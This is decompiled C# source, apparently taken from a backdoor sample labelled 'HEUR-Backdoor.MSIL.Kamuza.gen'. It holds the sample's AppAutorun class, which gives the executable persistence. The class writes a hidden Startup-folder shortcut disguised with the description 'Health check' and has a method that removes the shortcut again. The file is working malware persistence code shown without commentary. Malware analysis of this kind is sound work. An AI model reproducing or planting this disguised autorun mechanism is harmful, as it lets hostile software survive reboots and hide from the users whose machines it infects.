// Decompiled with JetBrains decompiler
// Type: JSS.AppAutorun
// Assembly: JSS, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CA27710C-27FC-4B6B-9AFB-DB45D81E1E20
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Backdoor.MSIL.Kamuza.gen-dd86898c784342fc11c42bea4c815cb536455ee709e7522fb64622d9171c465d.exe

using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Text;

namespace JSS
{
  internal class AppAutorun
  {
    public static void Set()
    {
      string str = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", "");
      string directoryName = Path.GetDirectoryName(str);
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
      string path2 = Path.GetFileNameWithoutExtension(str) + ".lnk";
      AppAutorun.IShellLink shellLink = (AppAutorun.IShellLink) new AppAutorun.ShellLink();
      shellLink.SetDescription("Health check");
      shellLink.SetPath(str);
      shellLink.SetWorkingDirectory(directoryName);
      shellLink.SetShowCmd(0);
      ((IPersistFile) shellLink).Save(Path.Combine(folderPath, path2), false);
    }

    public static void Reset()
    {
      string path1 = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", "");
      string path2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), Path.GetFileNameWithoutExtension(path1) + ".lnk");
      try
      {
        if (!File.Exists(path2))
          return;
        File.Delete(path2);
      }
      catch
      {
      }
    }

    [Guid("00021401-0000-0000-C000-000000000046")]
    [ComImport]
    internal class ShellLink
    {
      [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
      public extern ShellLink();
    }

    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [Guid("000214F9-0000-0000-C000-000000000046")]
    [ComImport]
    internal interface IShellLink
    {
      void GetPath([MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder pszFile, int cchMaxPath, out IntPtr pfd, int fFlags);

      void GetIDList(out IntPtr ppidl);

      void SetIDList(IntPtr pidl);

      void GetDescription([MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder pszName, int cchMaxName);

      void SetDescription([MarshalAs(UnmanagedType.LPWStr)] string pszName);

      void GetWorkingDirectory([MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder pszDir, int cchMaxPath);

      void SetWorkingDirectory([MarshalAs(UnmanagedType.LPWStr)] string pszDir);

      void GetArguments([MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder pszArgs, int cchMaxPath);

      void SetArguments([MarshalAs(UnmanagedType.LPWStr)] string pszArgs);

      void GetHotkey(out short pwHotkey);

      void SetHotkey(short wHotkey);

      void GetShowCmd(out int piShowCmd);

      void SetShowCmd(int iShowCmd);

      void GetIconLocation([MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder pszIconPath, int cchIconPath, out int piIcon);

      void SetIconLocation([MarshalAs(UnmanagedType.LPWStr)] string pszIconPath, int iIcon);

      void SetRelativePath([MarshalAs(UnmanagedType.LPWStr)] string pszPathRel, int dwReserved);

      void Resolve(IntPtr hwnd, int fFlags);

      void SetPath([MarshalAs(UnmanagedType.LPWStr)] string pszFile);
    }
  }
}
